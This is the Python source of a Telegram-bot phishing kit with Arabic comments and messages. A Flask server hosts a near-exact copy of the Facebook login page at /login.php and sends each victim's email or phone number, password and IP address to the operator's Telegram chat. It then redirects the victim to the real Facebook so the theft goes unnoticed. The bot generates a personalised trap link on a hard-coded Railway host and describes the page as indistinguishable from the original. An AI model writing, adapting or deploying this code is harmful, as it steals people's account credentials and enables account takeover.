import os
import threading
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask, request, render_template_string, redirect

BOT_TOKEN = os.getenv("BOT_TOKEN")
RAILWAY_URL = "https://daf-production-8df9.up.railway.app"

if not BOT_TOKEN:
    raise ValueError("[-] BOT_TOKEN is missing!")

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# ==========================================
# قالب فيسبوك المطابق للأصل تماماً (تصميم الموبايل والديسكتوب الدقيق)
# ==========================================
FB_PHISH_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول إلى فيسبوك</title>
    <style>
        body {
            background-color: #f0f2f5;
            font-family: Helvetica, Arial, sans-serif;
            direction: rtl;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }
        .fb-logo {
            margin-bottom: 20px;
        }
        .fb-logo img, .fb-logo svg {
            width: 112px;
            height: auto;
        }
        .card {
            background-color: #ffffff;
            border: none;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
            box-sizing: border-box;
            margin: 0 0 40px;
            padding: 20px;
            width: 396px;
            text-align: center;
        }
        .card input {
            border: 1px solid #dddfe2;
            color: #1d2129;
            font-size: 17px;
            padding: 14px 16px;
            margin-bottom: 12px;
            width: 90%;
            border-radius: 6px;
            outline: none;
            box-sizing: border-box;
        }
        .card input:focus {
            border-color: #1877f2;
            box-shadow: 0 0 0 2px #e7f3ff;
        }
        .login-btn {
            background-color: #1877f2;
            border: none;
            border-radius: 6px;
            color: #fff;
            font-size: 20px;
            line-height: 48px;
            padding: 0 16px;
            width: 100%;
            font-weight: bold;
            cursor: pointer;
            margin-bottom: 12px;
        }
        .login-btn:hover {
            background-color: #166fe5;
        }
        .forgot-link {
            color: #1877f2;
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
            display: block;
            margin-bottom: 20px;
        }
        .forgot-link:hover {
            text-decoration: underline;
        }
        hr {
            border: none;
            border-top: 1px solid #dadde1;
            margin: 20px 0;
        }
        .create-btn {
            background-color: #42b72a;
            border: none;
            border-radius: 6px;
            color: #fff;
            font-size: 17px;
            font-weight: bold;
            line-height: 48px;
            padding: 0 16px;
            cursor: pointer;
            display: inline-block;
            text-decoration: none;
        }
        .create-btn:hover {
            background-color: #36a420;
        }
    </style>
</head>
<body>
    <div class="fb-logo">
        <svg viewBox="0 0 214 45" width="150" height="32" class="fb_logo img sp_1Z-6q-12t9w sx_140733">
            <path fill="#1877f2" d="M116.3 29.5V18.2h-3.9v-3.7h3.9V12c0-3.9 2.3-6.1 5.9-6.1 1.7 0 3.2.1 3.6.2v3.7h-2.2c-1.9 0-2.5.9-2.5 2.4v2.1h4.6l-.6 3.7h-4v11.3h-4.8zM25.7 0C11.5 0 0 11.5 0 25.7c0 12.6 9 23 20.8 25.4V34.5h-6.3V25.7h6.3v-5.4c0-6.2 3.7-9.6 9.3-9.6 2.7 0 5.5.5 5.5.5v6.1h-3.1c-3.1 0-4.1 1.9-4.1 3.8v4.6h7l-1.1 5.4h-5.9v16.6C37 48.7 46 38.3 46 25.7 46 11.5 34.5 0 25.7 0z"></path>
        </svg>
    </div>
    
    <div class="card">
        <form method="POST">
            <input type="text" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
            <input type="password" name="pass" placeholder="كلمة السر" required>
            <button type="submit" class="login-btn">تسجيل الدخول</button>
            <a href="#" class="forgot-link">هل نسيت كلمة السر؟</a>
            <hr>
            <a href="#" class="create-btn">إنشاء حساب جديد</a>
        </form>
    </div>
</body>
</html>
"""

@app.route('/login.php', methods=['GET', 'POST'])
def fb_trap():
    target_chat_id = request.args.get('id', None)
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('pass')
        source_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        
        if target_chat_id:
            alert_msg = (
                "🚨 **صيد فيسبوك تم الإيقاع به بنجاح!**\n\n"
                f"👤 **البريد/الهاتف:** `{email}`\n"
                f"🔑 **كلمة السر:** `{password}`\n"
                f"🌐 **عنوان الـ IP:** `{source_ip}`"
            )
            try:
                bot.send_message(target_chat_id, alert_msg, parse_mode="Markdown")
            except Exception as e:
                print(f"[-] Telegram Error: {e}")
                
        return redirect("https://www.facebook.com", code=302)
        
    return render_template_string(FB_PHISH_TEMPLATE)

# ==========================================
# واجهة البوت (مخصصة لفيسبوك فقط وبدون زوائد)
# ==========================================
def main_menu():
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("🔗 توليد رابط مصيدة فيسبوك", callback_data="gen_fb_phish")
    )
    return markup

@bot.message_handler(commands=['start', 'panel'])
def start_command(message):
    user_name = message.from_user.first_name
    text = (
        f"⚡ **مرحباً بك يا {user_name} في منصة صيد فيسبوك المتخصصة**\n\n"
        "تمت تصفية المنصة والتركيز كلياً على أداة استهداف فيسبوك باحترافية تامة.\n"
        "اضغط على الزر أدناه لتوليد رابطك المُموه:"
    )
    bot.send_message(message.chat.id, text, parse_mode="Markdown", reply_markup=main_menu())

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    
    if call.data == "gen_fb_phish":
        bot.answer_callback_query(call.id, "جاري تجهيز الرابط...")
        phish_link = f"{RAILWAY_URL}/login.php?id={chat_id}"
        msg = (
            "🎯 **رابط المصيدة المخصص جاهز:**\n\n"
            f"`{phish_link}`\n\n"
            "الصفحة الآن مطابقة تماماً لشكل فيسبوك الأصلي (الشعار بالأعلى وخانات الإدخال تحتها مباشرة)، وعند التقاط البيانات يتم تحويل الضحية للموقع الحقيقي مباشرة."
        )
        bot.send_message(chat_id, msg, parse_mode="Markdown")

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)

if __name__ == "__main__":
    t = threading.Thread(target=run_flask)
    t.daemon = True
    t.start()
    bot.infinity_polling()
